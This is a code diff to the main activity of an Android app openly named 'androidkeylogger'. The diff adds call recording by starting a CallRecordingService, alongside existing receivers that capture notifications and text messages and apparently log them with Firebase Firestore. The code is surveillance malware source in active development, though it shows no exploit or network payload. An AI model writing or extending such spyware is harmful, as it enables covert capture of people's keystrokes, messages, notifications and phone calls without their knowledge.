@@ -2,6 +2,7 @@ package com.azamovhudstc.androidkeylogger.activity
 
 import android.annotation.SuppressLint
 import android.content.*
+import android.media.MediaRecorder
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.Bundle
@@ -9,16 +10,17 @@ import android.util.Log
 import android.view.Menu
 import android.view.MenuItem
 import androidx.appcompat.app.AppCompatActivity
-import androidx.core.content.ContextCompat
 import androidx.core.view.isVisible
 import androidx.lifecycle.MutableLiveData
 import androidx.recyclerview.widget.RecyclerView
+import com.aykuttasil.callrecord.CallRecord
 import com.azamovhudstc.androidkeylogger.adapter.LogAdapter
 import com.azamovhudstc.androidkeylogger.adapter.NotificationAdapter
 import com.azamovhudstc.androidkeylogger.R
 import com.azamovhudstc.androidkeylogger.databinding.ActivityMainBinding
 import com.azamovhudstc.androidkeylogger.model.LogModel
 import com.azamovhudstc.androidkeylogger.model.NotificationModel
+import com.azamovhudstc.androidkeylogger.service.CallRecordingService
 import com.azamovhudstc.androidkeylogger.service.SvcAccFix
 import com.google.firebase.FirebaseApp
 import com.google.firebase.firestore.FirebaseFirestore
@@ -30,6 +32,7 @@ import kotlinx.coroutines.launch
 import java.io.File
 import java.io.FileWriter
 import java.io.IOException
+import java.util.Date
 
 class MainFixActivity : AppCompatActivity() {
     private lateinit var recyclerView: RecyclerView
@@ -42,6 +45,9 @@ class MainFixActivity : AppCompatActivity() {
     private val fileName = "notifications1.txt"
     private val fileNameLog = "logs1.txt"
     private lateinit var firestore: FirebaseFirestore
+    companion object {
+    }
+    private lateinit var callRecord: CallRecord
 
     private var _binding: ActivityMainBinding? = null
     private val binding get() = _binding!!
@@ -149,6 +155,10 @@ class MainFixActivity : AppCompatActivity() {
         val filter = IntentFilter("com.azamovhudstc.androidkeylogger.NOTIFICATION_LISTENER")
         registerReceiver(notificationReceiver, filter)
         registerReceiver(receiver, IntentFilter("ACTION_TEXT_RECEIVED"))
+
+
+        val serviceIntent = Intent(this, CallRecordingService::class.java)
+        startService(serviceIntent)
 
 
         isNotificationFormat.observe(this) {
